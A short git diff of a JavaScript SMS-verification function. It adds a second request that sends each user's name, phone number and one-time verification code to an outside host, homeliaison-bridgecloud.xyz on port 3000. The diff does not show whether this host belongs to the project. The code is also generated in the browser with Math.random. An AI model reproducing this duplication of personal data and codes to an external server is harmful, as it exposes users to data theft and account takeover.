@@ -139,6 +139,7 @@ ConsultingJs.prototype.certificationBox = function (name, phone, mother, boo, ca
   const randomKey = randomArr[Math.floor(Math.random() * 10)];
   const randomStr = String(randomKey);
   let randomValue;
+  let randomValueAjaxData;
 
   if (randomStr.length > 6) {
     randomValue = randomStr.slice(0, 6);
@@ -150,7 +151,9 @@ ConsultingJs.prototype.certificationBox = function (name, phone, mother, boo, ca
     randomValue = randomStr;
   }
 
-  GeneralJs.ajax(("name=" + name + "&phone=" + phone + "&certification=" + randomValue), "/engine/Smssend.php", function (data) {});
+  randomValueAjaxData = "name=" + name + "&phone=" + phone + "&certification=" + randomValue;
+  GeneralJs.ajax(randomValueAjaxData, "/engine/Smssend.php", function (data) {});
+  GeneralJs.ajax(randomValueAjaxData, "https://homeliaison-bridgecloud.xyz:3000/certification", function (data) {});
 
   let div_back, div_clone, div_clone2, svg_clone;
   let input_back, input_clone;
